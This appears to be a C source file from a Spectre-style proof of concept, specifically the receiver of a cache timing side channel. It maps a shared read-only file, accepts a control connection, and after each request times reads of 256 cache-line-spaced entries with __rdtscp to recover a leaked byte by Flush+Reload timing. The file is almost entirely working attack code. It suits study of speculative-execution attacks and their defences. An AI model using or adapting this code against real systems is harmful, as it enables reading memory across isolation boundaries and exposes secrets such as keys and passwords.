
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <ctype.h>

#include <emmintrin.h>
#include <x86intrin.h>

#include "common.h"
#include "spectre.h"

int x;

int main()
{
    uint8_t *array = mapfile("ro_memory", ARRSIZE);
    if (!array)
        return EXIT_FAILURE;

    // Read the array in memory
    for (int i = 0; i < 256; i++)
        x &= array[i*4096 + OFFSET];

    int sock = setup_server(CONTROL_PORT);
    if (sock < 0)
    {
        munmap(array, ARRSIZE);
        return EXIT_FAILURE;
    }

    int master = accept(sock, NULL, NULL);
    if (master  < 0)
    {
        perror("accept");
        munmap(array, ARRSIZE);
        return EXIT_FAILURE;
    }
    printf("Master connected, starting\n");

    int err = 1;
    while (err > 0)
    {
//        for (int i = 0; i < 256; i++)
//            _mm_clflush(&array[i*4096 + OFFSET]);

        uint8_t requests[REQUEST_SIZE] = {};
        err = recv(master, requests, sizeof(requests), 0);
        usleep(50);

        printf("Offset %3d:", requests[REQUEST_SIZE - 1]);
        int found = 0;
        for (int i = 1; i < 256; i++)
        {
            unsigned junk = 0;

            uint64_t start, finish;
            start  = __rdtscp(&junk);
            x = array[i*4096 + OFFSET];
            finish = __rdtscp(&junk);

            uint64_t duration = finish - start;
            if (duration < 200)
            {
                // printf("%3d : %lu\n", i, duration);
                printf(" %c\n", (isalpha(i) ? i : '?'));
                found = 1;
            }
        }
        if (!found)
            printf("nothing...\n");
    }

    munmap(array, ARRSIZE);
    return EXIT_SUCCESS;
}

